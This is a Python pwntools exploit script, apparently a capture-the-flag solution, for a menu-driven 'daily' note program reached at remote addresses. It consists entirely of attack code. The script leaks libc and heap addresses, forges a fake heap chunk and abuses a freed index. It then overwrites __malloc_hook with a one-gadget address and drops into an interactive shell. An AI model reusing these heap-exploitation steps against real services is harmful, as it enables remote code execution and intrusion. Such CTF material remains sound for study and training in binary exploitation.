from pwn import *

context.log_level = 'debug'

#sh=process('./pwn')
#sh=remote('85c3e0fcae5e972af313488de60e8a5a.kr-lab.com','58512')#('111.198.29.45','32440')
sh = remote('39.106.224.151','60006')
elf = ELF('./pwn')
def show():
	sh.sendlineafter('choice:','1')
def add(length,con):
	sh.sendlineafter('choice:','2')
	sh.sendlineafter('daily:',str(length))
	sh.sendlineafter('daily\n',con)

def edit(idx,con):
        sh.sendlineafter('choice:','3')
        sh.sendlineafter('daily:',str(idx))
        sh.sendlineafter('daily\n',con)

def dele(idx):
        sh.sendlineafter('choice:','4')
        sh.sendlineafter('daily:',str(idx))

add(0x18,'a')  #0
add(0x18,'b') #1
dele(0)
add(0x1000,'c') #0

add(0x18,'a'*0x8) #2
show()

sh.recvuntil('a'*8)
leak = u64(sh.recvuntil('=',drop=True).ljust(8,'\x00'))
print hex(leak)
libc = leak - 0x3C4B0A
print 'libc: '+ hex(libc)

add(0x28,'d') #3
dele(0)

#one = libc+0x4526a
malloc_hook = leak - 0xd
#--------------------------------------------------
add(0x18,'a'*0x10)
show()

sh.recvuntil('a'*0x10)
leak = u64(sh.recv(4).ljust(8,'\x00'))
print hex(leak)
heap = leak - 0xa
print 'heap: '+hex(heap)

#-----------------------------------------------
idx = (heap +0xb0-0x602060)/0x10
add(0x38,p64(0)+p64(0x31))

add(0x18,p64(0x28)+p64(heap+0x80))#p64(malloc_hook))
print idx
#gdb.attach(sh)
dele(idx)

#gdb.attach(sh)
edit(4,p64(0)+p64(0x31)+p64(0x602098))

malloc_hook = libc+0x3c4b20-0x10
free_hook  = libc+0x3c67a8
one = libc + 0x45216#+0xf02a4#+0x4626a
#################################################
#gdb.attach(sh)
add(0x28,'a')
add(0x28,p64(malloc_hook)+p64(0))
edit(4,p64(one))
add(0x100,'a')
gdb.attach(sh)
dele(2)
sh.interactive()
